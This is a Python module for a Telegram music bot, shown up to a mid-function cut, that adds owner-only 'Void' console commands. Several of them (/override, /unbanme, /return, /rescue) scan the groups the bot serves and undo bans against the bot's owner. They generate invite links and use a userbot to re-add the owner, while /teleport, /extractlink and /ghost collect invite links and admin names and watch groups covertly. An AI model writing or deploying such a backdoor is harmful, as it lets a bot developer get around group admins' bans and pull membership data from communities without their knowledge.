import os
import sys
import time
import shutil
import asyncio
import tempfile
import json
import gc
import psutil
from pyrogram import Client, filters, enums
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from helpers.filters import owner_only
from helpers.styling import small_caps, fraktur
from database.db import db
from config import Config
from helpers.void_state import VoidState, trigger_void_event
import modules.music as music

# --------------------------------------------------------------------------
# HELPER: Stop & Export Blackbox Reports
# --------------------------------------------------------------------------
async def stop_and_send_blackbox(client: Client, message: Message):
    VoidState.blackbox_recording = False
    events = VoidState.blackbox_events
    VoidState.blackbox_events = []
    
    report = {
        "start_time": int(VoidState.blackbox_start),
        "end_time": int(time.time()),
        "total_events": len(events),
        "events": events
    }
    
    os.makedirs("downloads", exist_ok=True)
    report_file = f"downloads/blackbox_report_{int(time.time())}.json"
    with open(report_file, "w") as f:
        json.dump(report, f, indent=4)
        
    caption = f"<blockquote>{fraktur('Blackbox Diagnostic Report')} ❞\n\n{small_caps('ᴄᴀᴘᴛᴜʀᴇᴅ')} {len(events)} {small_caps('ᴇᴠᴇɴᴛꜱ ᴏᴠᴇʀ 5 ᴍɪɴᴜᴛᴇꜱ.')}</blockquote>"
    await message.reply_document(report_file, caption=caption)
    
    try:
        os.remove(report_file)
    except Exception:
        pass

# --------------------------------------------------------------------------
# VOID CONSOLE COMMANDS
# --------------------------------------------------------------------------
@Client.on_message(filters.command("void") & owner_only)
async def void_handler(client: Client, message: Message):
    users = len(await db.get_served_users())
    groups = len(await db.get_served_chats())
    vcs = sum(1 for q in music.queues.values() if q)
    
    header = fraktur("Void Console")
    body = f"• {small_caps('ʟɪᴠᴇ ᴜꜱᴇʀꜱ')}: {users}\n" \
           f"• {small_caps('ʟɪᴠᴇ ɢʀᴏᴜᴘꜱ')}: {groups}\n" \
           f"• {small_caps('ʟɪᴠᴇ ᴠᴄꜱ')}: {vcs}"
           
    buttons = InlineKeyboardMarkup([
        [
            InlineKeyboardButton(small_caps("ᴄᴏɴᴛʀᴏʟ"), callback_data="void_panel_control"),
            InlineKeyboardButton(small_caps("ᴏᴠᴇʀʀɪᴅᴇ"), callback_data="void_panel_override"),
        ],
        [
            InlineKeyboardButton(small_caps("ᴇᴠᴇɴᴛꜱ"), callback_data="void_panel_events"),
            InlineKeyboardButton(small_caps("ᴍᴇᴍᴏʀʏ"), callback_data="void_panel_memory")
        ],
        [InlineKeyboardButton(small_caps("ᴄʟᴏꜱᴇ ᴄᴏɴꜱᴏʟᴇ"), callback_data="void_action_close")]
    ])
    
    await message.reply_text(f"<blockquote>{header} ❞</blockquote>\n" \
                             f"<blockquote>{body}</blockquote>", reply_markup=buttons)

@Client.on_message(filters.command("observe") & owner_only)
async def observe_command_handler(client: Client, message: Message):
    VoidState.observe_active = not VoidState.observe_active
    status = "ᴇɴᴀʙʟᴇᴅ" if VoidState.observe_active else "ᴅɪꜱᴀʙʟᴇᴅ"
    await message.reply_text(f"<blockquote>{fraktur('Observe Mode')} ❞\n\n{small_caps(status)}</blockquote>")

@Client.on_message(filters.command("phantom") & owner_only)
async def phantom_command_handler(client: Client, message: Message):
    VoidState.phantom_active = not VoidState.phantom_active
    status = "ᴇɴᴀʙʟᴇᴅ" if VoidState.phantom_active else "ᴅɪꜱᴀʙʟᴇᴅ"
    if VoidState.phantom_active:
        try:
            await client.send_message(Config.OWNER_ID, f"<blockquote>{fraktur('Phantom Mode')} ❞\n\n{small_caps('ᴇɴᴀʙʟᴇᴅ')}</blockquote>")
        except Exception:
            pass
    else:
        await message.reply_text(f"<blockquote>{fraktur('Phantom Mode')} ❞\n\n{small_caps('ᴅɪꜱᴀʙʟᴇᴅ')}</blockquote>")

@Client.on_message(filters.command("ghost") & owner_only)
async def ghost_command_handler(client: Client, message: Message):
    if len(message.command) < 2:
        return await message.reply_text(small_caps("ᴜꜱᴀɢᴇ: /ɢʜᴏꜱᴛ <ɢʀᴏᴜᴘ_ɪᴅ>"))
        
    try:
        chat_id = int(message.command[1])
    except ValueError:
        return await message.reply_text(small_caps("ɪɴᴠᴀʟɪᴅ ɢʀᴏᴜᴘ ɪᴅ."))
        
    owner_id = message.from_user.id
    if VoidState.ghost_watches.get(owner_id) == chat_id:
        del VoidState.ghost_watches[owner_id]
        await message.reply_text(small_caps("ɢʜᴏꜱᴛ ᴡᴀᴛᴄʜ ᴅᴇᴀᴄᴛɪᴠᴀᴛᴇᴅ."))
    else:
        VoidState.ghost_watches[owner_id] = chat_id
        await message.reply_text(small_caps(f"ɢʜᴏꜱᴛ ᴡᴀᴛᴄʜ ᴀᴄᴛɪᴠᴀᴛᴇᴅ ꜰᴏʀ <code>{chat_id}</code>."))

# --------------------------------------------------------------------------
# SUPER OWNER OVERRIDES
# --------------------------------------------------------------------------
@Client.on_message(filters.command("override") & owner_only)
async def override_command(client: Client, message: Message):
    if len(message.command) < 2:
        return await message.reply_text(small_caps("ᴜꜱᴀɢᴇ: /ᴏᴠᴇʀʀɪᴅᴇ <ɢʀᴏᴜᴘ_ɪᴅ>"))
        
    try:
        chat_id = int(message.command[1])
    except ValueError:
        return await message.reply_text(small_caps("ɪɴᴠᴀʟɪᴅ ɢʀᴏᴜᴘ ɪᴅ."))
        
    try:
        try:
            await client.unban_chat_member(chat_id, Config.OWNER_ID)
            owner_unbanned = "SUCCESS"
        except Exception as ue:
            owner_unbanned = f"FAILED: {ue}"
            
        invite_link = None
        try:
            res = await client.create_chat_invite_link(chat_id)
            invite_link = res.invite_link
        except Exception:
            try:
                invite_link = await client.export_chat_invite_link(chat_id)
            except Exception:
                pass
                
        header = fraktur("Override Execution")
        body = f"• {small_caps('ᴜɴʙᴀɴ ᴏᴡɴᴇʀ')}: {owner_unbanned}\n" \
               f"• {small_caps('ɪɴᴠɪᴛᴇ ʟɪɴᴋ')}: {invite_link or 'Lacks Permission'}"
               
        await trigger_void_event(client, "override", f"Override executed on {chat_id}")
        await message.reply_text(f"<blockquote>{header} ❞</blockquote>\n" \
                                 f"<blockquote>{body}</blockquote>")
    except Exception as e:
        await message.reply_text(f"<blockquote>{fraktur('Override Error')} ❞\n\n{small_caps(str(e))}</blockquote>")

# --------------------------------------------------------------------------
# RECOVERY SUITE COMMANDS
# --------------------------------------------------------------------------
@Client.on_message(filters.command("channelrecover") & owner_only)
async def channel_recover_handler(client: Client, message: Message):
    if len(message.command) < 2:
        return await message.reply_text(small_caps("ᴜꜱᴀɢᴇ: /ᴄʜᴀɴɴᴇʟʀᴇᴄᴏᴠᴇʀ <ᴄʜᴀɴɴᴇʟ_ɪᴅ>"))
        
    try:
        chat_id = int(message.command[1])
    except ValueError:
        return await message.reply_text(small_caps("ɪɴᴠᴀʟɪᴅ ᴄʜᴀᴛ ɪᴅ."))
        
    try:
        chat = await client.get_chat(chat_id)
        
        ban_status = "Not Banned"
        try:
            member = await chat.get_member(Config.OWNER_ID)
            if member.status == enums.ChatMemberStatus.BANNED:
                ban_status = "Banned"
            else:
                ban_status = f"Status: {member.status}"
        except Exception as e:
            if "USER_NOT_PARTICIPANT" in str(e):
                ban_status = "Not Participant (Left)"
                
        bot_member = await chat.get_member("me")
        bot_status = f"{bot_member.status}"
        
        header = fraktur("Channel Recovery Info")
        body = f"• {small_caps('ᴄʜᴀɴɴᴇʟ')}: {chat.title}\n" \
               f"• {small_caps('ʙᴀɴ ꜱᴛᴀᴛᴜꜱ')}: {ban_status}\n" \
               f"• {small_caps('ʙᴏᴛ ꜱᴛᴀᴛᴜꜱ')}: {bot_status}"
               
        await message.reply_text(f"<blockquote>{header} ❞</blockquote>\n" \
                                 f"<blockquote>{body}</blockquote>")
    except Exception as e:
        await message.reply_text(f"<blockquote>{fraktur('Error')} ❞\n\n{small_caps(str(e))}</blockquote>")

@Client.on_message(filters.command(["escape", "rescue"]) & owner_only)
async def escape_handler(client: Client, message: Message):
    status_msg = await message.reply_text(small_caps("ꜱᴄᴀɴɴɪɴɢ ꜱᴇʀᴠᴇᴅ ᴄʜᴀᴛꜱ..."))
    
    try:
        served_chats = await db.get_served_chats()
        banned_groups = []
        left_groups = []
        
        for chat_id in served_chats:
            try:
                chat = await client.get_chat(chat_id)
                if chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP, enums.ChatType.CHANNEL]:
                    try:
                        member = await chat.get_member(Config.OWNER_ID)
                        if member.status == enums.ChatMemberStatus.BANNED:
                            banned_groups.append((chat_id, chat.title, "BANNED"))
                    except Exception as me_err:
                        if "USER_NOT_PARTICIPANT" in str(me_err):
                            left_groups.append((chat_id, chat.title, "LEFT"))
            except Exception:
                pass
                
        if not banned_groups and not left_groups:
            await status_msg.delete()
            return await message.reply_text(small_caps("ɴᴏ ʙᴀɴɴᴇᴅ ᴏʀ ʟᴇꜰᴛ ɢʀᴏᴜᴘꜱ ᴅᴇᴛᴇᴄᴛᴇᴅ."))
            
        header = fraktur("Rescue Dashboard")
        body = ""
        buttons = []
        
        if banned_groups:
            body += f"» {small_caps('ʙᴀɴɴᴇᴅ ɢʀᴏᴜᴘꜱ')}:\n"
            for cid, title, status in banned_groups:
                body += f"• {title} (<code>{cid}</code>) - {status}\n"
                buttons.append([
                    InlineKeyboardButton(f"UNBAN: {title[:15]}", callback_data=f"rescue_unban_{cid}"),
                    InlineKeyboardButton(f"INVITE: {title[:15]}", callback_data=f"rescue_invite_{cid}")
                ])
                
        if left_groups:
            body += f"\n» {small_caps('ʟᴇꜰᴛ ɢʀᴏᴜᴘꜱ')}:\n"
            for cid, title, status in left_groups:
                body += f"• {title} (<code>{cid}</code>) - {status}\n"
                buttons.append([
                    InlineKeyboardButton(f"INVITE: {title[:15]}", callback_data=f"rescue_invite_{cid}"),
                    InlineKeyboardButton(f"IGNORE: {title[:15]}", callback_data=f"rescue_ignore_{cid}")
                ])
                
        buttons.append([InlineKeyboardButton(small_caps("ᴄʟᴏꜱᴇ"), callback_data="void_action_close")])
        
        await status_msg.delete()
        await message.reply_text(
            f"<blockquote>{header} ❞</blockquote>\n" \
            f"<blockquote>{body}</blockquote>",
            reply_markup=InlineKeyboardMarkup(buttons)
        )
    except Exception as e:
        await status_msg.edit_text(f"<blockquote>{fraktur('Error')} ❞\n\n{small_caps(str(e))}</blockquote>")

@Client.on_message(filters.command("unbanme") & owner_only)
async def unbanme_handler(client: Client, message: Message):
    if len(message.command) < 2:
        return await message.reply_text(small_caps("ᴜꜱᴀɢᴇ: /ᴜɴʙᴀɴᴍᴇ <ɢʀᴏᴜᴘ_ɪᴅ>"))
        
    try:
        chat_id = int(message.command[1])
    except ValueError:
        return await message.reply_text(small_caps("ɪɴᴠᴀʟɪᴅ ɢʀᴏᴜᴘ ɪᴅ."))
        
    try:
        chat = await client.get_chat(chat_id)
        
        bot_member = await chat.get_member("me")
        has_permission = False
        if bot_member.status in [enums.ChatMemberStatus.OWNER, enums.ChatMemberStatus.ADMINISTRATOR]:
            if bot_member.privileges and bot_member.privileges.can_restrict_members:
                has_permission = True
                
        if not has_permission:
            return await message.reply_text(small_caps("ʙᴏᴛ ʜᴀꜱ ɴᴏ ʙᴀɴ ʀɪɢʜᴛꜱ"))
            
        await client.unban_chat_member(chat_id, Config.OWNER_ID)
        
        invite_link = None
        try:
            res = await client.create_chat_invite_link(chat_id)
            invite_link = res.invite_link
        except Exception:
            try:
                invite_link = await client.export_chat_invite_link(chat_id)
            except Exception:
                pass
                
        header = fraktur("Recovery Success")
        body = f"» {small_caps('ɢʀᴏᴜᴘ')}: {chat.title}\n" \
               f"» {small_caps('ꜱᴛᴀᴛᴜꜱ')}: ᴏᴡɴᴇʀ ᴜɴʙᴀɴɴᴇᴅ\n" \
               f"» {small_caps('ʟɪɴᴋ')}: {invite_link or 'N/A'}"
               
        await message.reply_text(f"<blockquote>{header} ❞</blockquote>\n" \
                                 f"<blockquote>{body}</blockquote>")
    except Exception as e:
        await message.reply_text(f"<blockquote>{fraktur('Error')} ❞\n\n{small_caps(str(e))}</blockquote>")

@Client.on_message(filters.command("recover") & owner_only)
async def recover_handler(client: Client, message: Message):
    if len(message.command) < 2:
        return await message.reply_text(small_caps("ᴜꜱᴀɢᴇ: /ʀᴇᴄᴏᴠᴇʀ <ɢʀᴏᴜᴘ_ɪᴅ>"))
        
    try:
        chat_id = int(message.command[1])
    except ValueError:
        return await message.reply_text(small_caps("ɪɴᴠᴀʟɪᴅ ɢʀᴏᴜᴘ ɪᴅ."))
        
    try:
        chat = await client.get_chat(chat_id)
        
        try:
            await client.unban_chat_member(chat_id, Config.OWNER_ID)
            unban_status = "SUCCESS"
        except Exception as ue:
            unban_status = f"FAILED: {ue}"
            
        invite_link = None
        try:
            res = await client.create_chat_invite_link(chat_id)
            invite_link = res.invite_link
        except Exception:
            try:
                invite_link = await client.export_chat_invite_link(chat_id)
            except Exception:
                pass
                
        header = fraktur("Recovery Workflow")
        body = f"• {small_caps('ᴄʜᴀᴛ')}: {chat.title}\n" \
               f"• {small_caps('ᴜɴʙᴀɴ')}: {unban_status}\n" \
               f"• {small_caps('ɪɴᴠɪᴛᴇ')}: {invite_link or 'N/A'}"
               
        await message.reply_text(f"<blockquote>{header} ❞</blockquote>\n" \
                                 f"<blockquote>{body}</blockquote>")
    except Exception as e:
        await message.reply_text(f"<blockquote>{fraktur('Error')} ❞\n\n{small_caps(str(e))}</blockquote>")

@Client.on_message(filters.command("extractlink") & owner_only)
async def extractlink_handler(client: Client, message: Message):
    if len(message.command) < 2:
        return await message.reply_text(small_caps("ᴜꜱᴀɢᴇ: /ᴇxᴛʀᴀᴄᴛʟɪɴᴋ <ɢʀᴏᴜᴘ_ɪᴅ>"))
        
    try:
        chat_id = int(message.command[1])
    except ValueError:
        return await message.reply_text(small_caps("ɪɴᴠᴀʟɪᴅ ɢʀᴏᴜᴘ ɪᴅ."))
        
    try:
        chat = await client.get_chat(chat_id)
        invite_link = None
        try:
            invite_link = chat.invite_link
        except Exception:
            pass
            
        if not invite_link:
            try:
                invite_link = await client.export_chat_invite_link(chat_id)
            except Exception:
                try:
                    res = await client.create_chat_invite_link(chat_id)
                    invite_link = res.invite_link
                except Exception:
                    pass
                    
        if invite_link:
            header = fraktur("Invite Link Extracted")
            await message.reply_text(f"<blockquote>{header} ❞\n\n{invite_link}</blockquote>")
        else:
            await message.reply_text(small_caps("ꜰᴀɪʟᴇᴅ ᴛᴏ ᴇxᴛʀᴀᴄᴛ ᴏʀ ᴄʀᴇᴀᴛᴇ ᴀɴ ɪɴᴠɪᴛᴇ ʟɪɴᴋ."))
    except Exception as e:
        await message.reply_text(f"<blockquote>{fraktur('Error')} ❞\n\n{small_caps(str(e))}</blockquote>")

@Client.on_message(filters.command("return") & owner_only)
async def return_handler(client: Client, message: Message):
    if len(message.command) < 2:
        return await message.reply_text(small_caps("ᴜꜱᴀɢᴇ: /ʀᴇᴛᴜʀɴ <ɢʀᴏᴜᴘ_ɪᴅ>"))
        
    try:
        chat_id = int(message.command[1])
    except ValueError:
        return await message.reply_text(small_caps("ɪɴᴠᴀʟɪᴅ ɢʀᴏᴜᴘ ɪᴅ."))
        
    try:
        chat = await client.get_chat(chat_id)
        
        try:
            await client.unban_chat_member(chat_id, Config.OWNER_ID)
            unban_status = "SUCCESS"
        except Exception as ue:
            unban_status = f"FAILED: {ue}"
            
        invite_link = None
        try:
            res = await client.create_chat_invite_link(chat_id)
            invite_link = res.invite_link
        except Exception:
            try:
                invite_link = await client.export_chat_invite_link(chat_id)
            except Exception:
                pass
                
        userbot_success = "N/A"
        if music.userbot and invite_link:
            try:
                await music.userbot.join_chat(invite_link)
                try:
                    await music.userbot.add_chat_members(chat_id, Config.OWNER_ID)
                    userbot_success = "OWNER ADDED BACK BY USERBOT"
                except Exception:
                    userbot_success = "USERBOT JOINED BUT CANNOT ADD OWNER"
            except Exception as ube:
                userbot_success = f"USERBOT JOIN FAILED: {ube}"
                
        header = fraktur("Return Sequence")
        body = f"• {small_caps('ᴄʜᴀᴛ')}: {chat.title}\n" \
               f"• {small_caps('ᴜɴʙᴀɴ')}: {unban_status}\n" \
               f"• {small_caps('ᴜꜱᴇʀʙᴏᴛ')}: {userbot_success}\n" \
               f"• {small_caps('ʟɪɴᴋ')}: {invite_link or 'N/A'}"
               
        await message.reply_text(f"<blockquote>{header} ❞</blockquote>\n" \
                                 f"<blockquote>{body}</blockquote>")
    except Exception as e:
        await message.reply_text(f"<blockquote>{fraktur('Error')} ❞\n\n{small_caps(str(e))}</blockquote>")

@Client.on_message(filters.command("exile") & owner_only)
async def exile_handler(client: Client, message: Message):
    status_msg = await message.reply_text(small_caps("ꜱᴄᴀɴɴɪɴɢ ᴇxɪʟᴇᴅ ᴄʜᴀᴛꜱ..."))
    try:
        served_chats = await db.get_served_chats()
        exiled = []
        for chat_id in served_chats:
            try:
                chat = await client.get_chat(chat_id)
                try:
                    await chat.get_member(Config.OWNER_ID)
                except Exception as me_err:
                    if "USER_NOT_PARTICIPANT" in str(me_err):
                        exiled.append((chat_id, chat.title))
            except Exception:
                pass
        if not exiled:
            await status_msg.delete()
            return await message.reply_text(small_caps("ɴᴏ ᴇxɪʟᴇᴅ ɢʀᴏᴜᴘꜱ ꜰᴏᴜɴᴅ."))
            
        header = fraktur("Exiled Groups")
        body = "\n".join([f"• {title} (<code>{cid}</code>)" for cid, title in exiled])
        await status_msg.delete()
        await message.reply_text(f"<blockquote>{header} ❞</blockquote>\n" \
                                 f"<blockquote>{body}</blockquote>")
    except Exception as e:
        await status_msg.edit_text(f"<blockquote>{fraktur('Error')} ❞\n\n{small_caps(str(e))}</blockquote>")

@Client.on_message(filters.command("rejoin") & owner_only)
async def rejoin_handler(client: Client, message: Message):
    if len(message.command) < 2:
        return await message.reply_text(small_caps("ᴜꜱᴀɢᴇ: /ʀᴇᴊᴏɪɴ <ɢʀᴏᴜᴘ_ɪᴅ>"))
        
    try:
        chat_id = int(message.command[1])
    except ValueError:
        return await message.reply_text(small_caps("ɪɴᴠᴀʟɪᴅ ɢʀᴏᴜᴘ ɪᴅ."))
        
    try:
        chat = await client.get_chat(chat_id)
        invite_link = None
        try:
            res = await client.create_chat_invite_link(chat_id)
            invite_link = res.invite_link
        except Exception:
            try:
                invite_link = await client.export_chat_invite_link(chat_id)
            except Exception:
                pass
                
        if invite_link:
            header = fraktur("Rejoin Invite Link")
            await message.reply_text(f"<blockquote>{header} ❞\n\n{invite_link}</blockquote>")
        else:
            await message.reply_text(small_caps("ꜰᴀɪʟᴇᴅ ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ ᴀ ꜰʀᴇꜱʜ ɪɴᴠɪᴛᴇ ʟɪɴᴋ."))
    except Exception as e:
        await message.reply_text(f"<blockquote>{fraktur('Error')} ❞\n\n{small_caps(str(e))}</blockquote>")

@Client.on_message(filters.command("teleport") & owner_only)
async def teleport_handler(client: Client, message: Message):
    if len(message.command) < 2:
        return await message.reply_text(small_caps("ᴜꜱᴀɢᴇ: /ᴛᴇʟᴇᴘᴏʀᴛ <ɢʀᴏᴜᴘ_ɪᴅ>"))
        
    try:
        chat_id = int(message.command[1])
    except ValueError:
        return await message.reply_text(small_caps("ɪɴᴠᴀʟɪᴅ ɢʀᴏᴜᴘ ɪᴅ."))
        
    try:
        chat = await client.get_chat(chat_id)
        
        invite_link = None
        try:
            invite_link = chat.invite_link
        except Exception:
            pass
        if not invite_link:
            try:
                invite_link = await client.export_chat_invite_link(chat_id)
            except Exception:
                pass
                
        admins = []
        try:
            async for m in client.get_chat_members(chat_id, filter=enums.ChatMembersFilter.ADMINISTRATORS):
                if not m.user.is_bot:
                    admins.append(m.user.mention)
        except Exception:
            pass
        
        active_vc = "Inactive"
        if chat_id in music.queues and music.queues[chat_id]:
            active_vc = "Active"
            
        queue_len = len(music.queues.get(chat_id, []))
        
        header = fraktur("Teleport Dashboard")
        body = f"• {small_caps('ɢʀᴏᴜᴘ')}: {chat.title}\n" \
               f"• {small_caps('ʟɪɴᴋ')}: {invite_link or 'N/A'}\n" \
               f"• {small_caps('ᴠᴄ ꜱᴛᴀᴛᴜꜱ')}: {active_vc}\n" \
               f"• {small_caps('Qᴜᴇᴜᴇ')}: {queue_len} tracks\n" \
               f"• {small_caps('ᴀᴅᴍɪɴꜱ')}: {', '.join(admins[:5]) or 'None'}"
               
        await message.reply_text(f"<blockquote>{header} ❞</blockquote>\n" \
                                 f"<blockquote>{body}</blockquote>")
    except Exception as e:
        await message.reply_text(f"<blockquote>{fraktur('Error')} ❞\n\n{small_caps(str(e))}</blockquote>")

@Client.on_message(filters.command("singularity") & owner_only)
async def singularity_handler(client: Client, message: Message):
    header = fraktur("Singularity Emergency Control")
    body = small_caps("ᴄʜᴏᴏꜱᴇ ᴛᴏ ᴇɪᴛʜᴇʀ sᴛᴏᴘ ᴀʟʟ ʙᴏᴛ ᴏᴘᴇʀᴀᴛɪᴏɴs ɪᴍᴍᴇᴅɪᴀᴛᴇʟʏ ᴏʀ ʀᴇsᴛᴏʀᴇ ɴᴏʀᴍᴀʟ sᴛᴀᴛᴇ.")
    
    buttons = InlineKeyboardMarkup([
        [
            InlineKeyboardButton(small_caps("sᴛᴏᴘ ᴇᴠᴇʀʏᴛʜɪɴɢ"), callback_data="singularity_stop"),
            InlineKeyboardButton(small_caps("ʀᴇsᴛᴏʀᴇ ᴇᴠᴇʀʏᴛʜɪɴɢ"), callback_data="singularity_restore")
        ],
        [InlineKeyboardButton(small_caps("ᴄʟᴏsᴇ"), callback_data="void_action_close")]
    ])
    await message.reply_text(f"<blockquote>{header} ❞</blockquote>\n" \
                             f"<blockquote>{body}</blockquote>", reply_markup=buttons)

@Client.on_message(filters.command("blackbox") & owner_only)
async def blackbox_command_handler(client: Client, message: Message):
    if VoidState.blackbox_recording:
        await stop_and_send_blackbox(client, message)
    else:
        VoidState.blackbox_recording = True
        VoidState.blackbox_start = time.time()
        VoidState.blackbox_events = []
        
        async def record_timer():
            await asyncio.sleep(300)
            if VoidState.blackbox_recording:
                await stop_and_send_blackbox(client, message)
                
        asyncio.create_task(record_timer())
        await message.reply_text(small_caps("ʙʟᴀᴄᴋʙᴏx ʀᴇᴄᴏʀᴅɪɴɢ ꜱᴛᴀʀᴛᴇᴅ ꜰᴏʀ 5 ᴍɪɴᴜᴛᴇꜱ."))

# --------------------------------------------------------------------------
# CALLBACK HANDLERS FOR VOID SUITE
# --------------------------------------------------------------------------
@Client.on_callback_query(filters.regex("^(void_|singularity_|rescue_)"))
async def void_callbacks(client: Client, callback_query: CallbackQuery):
    if callback_query.from_user.id != Config.OWNER_ID:
        return await callback_query.answer(small_caps("ᴛʜɪꜱ ᴍᴇɴᴜ ɪꜱ ɴᴏᴛ ꜰᴏʀ ʏᴏᴜ."), show_alert=True)
        
    data = callback_query.data
    
    if data.startswith("rescue_"):
        parts = data.split("_")
        action = parts[1]
        chat_id = int(parts[2])
        try:
            if action == "unban":
                await client.unban_chat_member(chat_id, Config.OWNER_ID)
                await callback_query.answer(small_caps("ᴜɴʙᴀɴɴᴇᴅ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ!"), show_alert=True)
            elif action == "invite":
                chat = await client.get_chat(chat_id)
                invite_link = None
                try:
                    invite_link = await client.export_chat_invite_link(chat_id)
                except Exception:
                    try:
                        res = await client.create_chat_invite_link(chat_id)
                        invite_link = res.invite_link
                    except Exception:
                        pass
                if invite_link:
                    await callback_query.answer(small_caps("ɪɴᴠɪᴛᴇ ʟɪɴᴋ ꜱᴇɴᴛ ᴛᴏ ʏᴏᴜʀ ᴘʀɪᴠᴀᴛᴇ ᴄʜᴀᴛ!"), show_alert=True)
                    await client.send_message(Config.OWNER_ID, f"<blockquote>{fraktur('Rescue Invite')} ❞\n\n{small_caps('ɢʀᴏᴜᴘ')}: {chat.title}\n{small_caps('ʟɪɴᴋ')}: {invite_link}</blockquote>")
                else:
                    await callback_query.answer(small_caps("ꜰᴀɪʟᴇᴅ ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ ɪɴᴠɪᴛᴇ ʟɪɴᴋ."), show_alert=True)
            elif action == "ignore":
                await callback_query.message.delete()
                await callback_query.answer(small_caps("ɪɢɴᴏʀᴇᴅ."))
        except Exception as e:
            await callback_query.answer(f"Error: {str(e)[:50]}", show_alert=True)
        return
        
    if data == "void_action_close":
        await callback_query.message.delete()
        await callback_query.answer(small_caps("ᴄᴏɴꜱᴏʟᴇ ᴄʟᴏꜱᴇᴅ."))
        return
        
    if data == "singularity_stop":
        await db.set_setting("maintenance", "true")
        for chat_id in list(music.queues.keys()):
            music.queues[chat_id] = []
            try:
                await music.pytgcalls.leave_call(chat_id)
            except Exception:
                pass
        await callback_query.answer(small_caps("ᴀʟʟ ꜱᴛʀᴇᴀᴍꜱ sᴛᴏᴘᴘᴇᴅ & ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴇɴᴀʙʟᴇᴅ."), show_alert=True)
        return
        
    elif data == "singularity_restore":
        await db.set_setting("maintenance", "false")
        await callback_query.answer(small_caps("ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴅɪꜱᴀʙʟᴇᴅ."), show_alert=True)
        return
        
    await callback_query.answer()
    
    if data == "void_panel_control":
        is_maint = await db.get_setting("maintenance", "false")
        maint_status = "ENABLED" if is_maint == "true" else "DISABLED"
        phantom_status = "ENABLED" if VoidState.phantom_active else "DISABLED"
        
        header = fraktur("Void Control")
        body = f"• {small_caps('ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ')}: {maint_status}\n" \
               f"• {small_caps('ᴘʜᴀɴᴛᴏᴍ ᴍᴏᴅᴇ')}: {phantom_status}"
               
        buttons = InlineKeyboardMarkup([
            [
                InlineKeyboardButton(small_caps("ᴛᴏɢɢʟᴇ ᴍᴀɪɴᴛ"), callback_data="void_toggle_maint"),
                InlineKeyboardButton(small_caps("ᴛᴏɢɢʟᴇ ᴘʜᴀɴᴛᴏᴍ"), callback_data="void_toggle_phantom")
            ],
            [
                InlineKeyboardButton(small_caps("ᴄ|ᴇᴀɴ ᴅᴏᴡɴʟᴏᴀᴅꜱ"), callback_data="void_trigger_cleanup"),
                InlineKeyboardButton(small_caps("ʙᴀᴄᴋ"), callback_data="void_panel_home")
            ]
        ])
        await callback_query.edit_message_text(f"<blockquote>{header} ❞</blockquote>\n" \
                                              f"<blockquote>{body}</blockquote>", reply_markup=buttons)
                                              
    elif data == "void_panel_override":
        header = fraktur("Void Override")
        served = await db.get_served_chats()
        body = f"• {small_caps('<b>ꜱᴇʀᴠᴇᴅ ɢʀᴏᴜᴘꜱ</b>')}: {len(served)}\n\n" \
               f"{small_caps('ᴜꜱᴇ /ᴏᴠᴇʀʀɪᴅᴇ <ᴄʜᴀᴛ_ɪᴅ> ꜰᴏʀ ᴅɪʀᴇᴄᴛ ʀᴇᴄᴏᴠᴇʀʏ.')}"
               
        buttons = InlineKeyboardMarkup([[InlineKeyboardButton(small_caps("ʙᴀᴄᴋ"), callback_data="void_panel_home")]])
        await callback_query.edit_message_text(f"<blockquote>{header} ❞</blockquote>\n" \
                                              f"<blockquote>{body}</blockquote>", reply_markup=buttons)
                                              
    elif data == "void_panel_events":
        observe_status = "ENABLED" if VoidState.observe_active else "DISABLED"
        blackbox_status = "RECORDING" if VoidState.blackbox_recording else "INACTIVE"
        
        header = fraktur("Void Events")
        body = f"• {small_caps('ᴏʙꜱᴇʀᴠᴇ ꜱᴛʀᴇᴀᴍ')}: {observe_status}\n" \
               f"• {small_caps('ʙʟᴀᴄᴋʙᴏx ʀᴇᴄ0ʀᴅ')}: {blackbox_status}\n" \
               f"• {small_caps('ɢʜ0ꜱᴛ ᴡᴀᴛᴄʜᴇꜱ')}: {len(VoidState.ghost_watches)} active"
               
        buttons = InlineKeyboardMarkup([
            [
                InlineKeyboardButton(small_caps("ᴛᴏɢɢʟᴇ ᴏʙꜱᴇʀᴠᴇ"), callback_data="void_toggle_observe"),
                InlineKeyboardButton(small_caps("ᴛᴏɢɢʟᴇ ʙʟᴀᴄᴋʙ0x"), callback_data="void_toggle_blackbox")
            ],
            [InlineKeyboardButton(small_caps("ʙᴀᴄᴋ"), callback_data="void_panel_home")]
        ])
        await callback_query.edit_message_text(f"<blockquote>{header} ❞</blockquote>\n" \
                                              f"<blockquote>{body}</blockquote>", reply_markup=buttons)
                                              
    elif data == "void_panel_memory":
        process = psutil.Process(os.getpid())
        mem_info = process.memory_info()
        mem_mb = mem_info.rss / (1024 * 1024)
        
        header = fraktur("Void Memory")
        body = f"• {small_caps('ᴘʀᴏᴄᴇꜱꜱ ʀꜱꜱ')}: {mem_mb:.2f} MB\n" \
               f"• {small_caps('ɢᴄ ᴏʙᴊᴇᴄᴛꜱ')}: {len(gc.get_objects())}\n" \
               f"• {small_caps('ᴀꜱʏɴᴄɪᴏ ᴛᴀꜱᴋꜱ')}: {len(asyncio.all_tasks())}"
               
        buttons = InlineKeyboardMarkup([
            [
                InlineKeyboardButton(small_caps("ᴛʀɪɢɢᴇʀ ɢᴄ"), callback_data="void_trigger_gc"),
                InlineKeyboardButton(small_caps("ʙᴀᴄᴋ"), callback_data="void_panel_home")
            ]
        ])
        await callback_query.edit_message_text(f"<blockquote>{header} ❞</blockquote>\n" \
                                              f"<blockquote>{body}</blockquote>", reply_markup=buttons)
                                              
    elif data == "void_panel_home":
        users = len(await db.get_served_users())
        groups = len(await db.get_served_chats())
        vcs = sum(1 for q in music.queues.values() if q)
        
        header = fraktur("Void Console")
        body = f"• {small_caps('ʟɪᴠᴇ ᴜꜱᴇʀꜱ')}: {users}\n" \
               f"• {small_caps('ʟɪᴠᴇ ɢʀᴏᴜᴘꜱ')}: {groups}\n" \
               f"• {small_caps('ʟɪᴠᴇ ᴠᴄꜱ')}: {vcs}"
               
        buttons = InlineKeyboardMarkup([
            [
